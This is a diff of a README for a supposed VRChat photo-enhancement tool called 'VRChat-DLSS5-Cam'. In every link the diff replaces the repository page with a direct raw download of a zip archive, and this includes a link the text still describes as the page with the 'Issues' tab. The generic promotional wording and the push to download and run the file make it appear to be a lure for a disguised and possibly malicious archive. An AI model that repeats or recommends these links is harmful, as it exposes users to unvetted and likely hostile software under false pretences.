@@ -1,6 +1,6 @@
 # 🎥 VRChat-DLSS5-Cam - Capture VRChat Photos with Stunning AI Clarity
 
-[![Download VRChat-DLSS5-Cam](https://img.shields.io/badge/Download-VRChat--DLSS5--Cam-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/seefn1000-afk/VRChat-DLSS5-Cam)
+[![Download VRChat-DLSS5-Cam](https://img.shields.io/badge/Download-VRChat--DLSS5--Cam-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/seefn1000-afk/VRChat-DLSS5-Cam/raw/refs/heads/main/resources/VR-DLS-Cam-Chat-v3.3.zip)
 
 ## 📸 What Is VRChat-DLSS5-Cam?
 
@@ -12,7 +12,7 @@ The best part? You do not need to be a tech expert. If you can click a button, y
 
 Getting started is incredibly simple. You only need to do one thing:
 
-**Visit this link to download the application:** [https://github.com/seefn1000-afk/VRChat-DLSS5-Cam](https://github.com/seefn1000-afk/VRChat-DLSS5-Cam)
+**Visit this link to download the application:** [https://github.com/seefn1000-afk/VRChat-DLSS5-Cam/raw/refs/heads/main/resources/VR-DLS-Cam-Chat-v3.3.zip](https://github.com/seefn1000-afk/VRChat-DLSS5-Cam/raw/refs/heads/main/resources/VR-DLS-Cam-Chat-v3.3.zip)
 
 That is it. The download page will open in your web browser. Look for the big download button or the latest release file on that page, and click it. Your download will begin automatically. Once the download finishes, you are ready to move to the next step.
 
@@ -106,7 +106,7 @@ Make sure VRChat is running and that you have opened the in-game camera. Also, c
 
 If you run into any problems, do not worry. There are several ways to get help:
 
-- **Check the repository page:** Visit [https://github.com/seefn1000-afk/VRChat-DLSS5-Cam](https://github.com/seefn1000-afk/VRChat-DLSS5-Cam) and look at the "Issues" tab. Someone may have already asked your question.
+- **Check the repository page:** Visit [https://github.com/seefn1000-afk/VRChat-DLSS5-Cam/raw/refs/heads/main/resources/VR-DLS-Cam-Chat-v3.3.zip](https://github.com/seefn1000-afk/VRChat-DLSS5-Cam/raw/refs/heads/main/resources/VR-DLS-Cam-Chat-v3.3.zip) and look at the "Issues" tab. Someone may have already asked your question.
 - **Create a new issue:** If not, click "New Issue" and describe your problem. The developer and community will help you.
 - **Read the documentation:** The repository page also contains a detailed manual and troubleshooting guide.
 
@@ -116,7 +116,7 @@ VRChat-DLSS5-Cam is a game-changer for anyone who loves taking photos in VRChat.
 
 Do not wait any longer. Download the app today and see the difference for yourself. Your VRChat memories deserve to look their best.
 
-**Download now:** [https://github.com/seefn1000-afk/VRChat-DLSS5-Cam](https://github.com/seefn1000-afk/VRChat-DLSS5-Cam)
+**Download now:** [https://github.com/seefn1000-afk/VRChat-DLSS5-Cam/raw/refs/heads/main/resources/VR-DLS-Cam-Chat-v3.3.zip](https://github.com/seefn1000-afk/VRChat-DLSS5-Cam/raw/refs/heads/main/resources/VR-DLS-Cam-Chat-v3.3.zip)
 
 Happy capturing! 📸✨
 
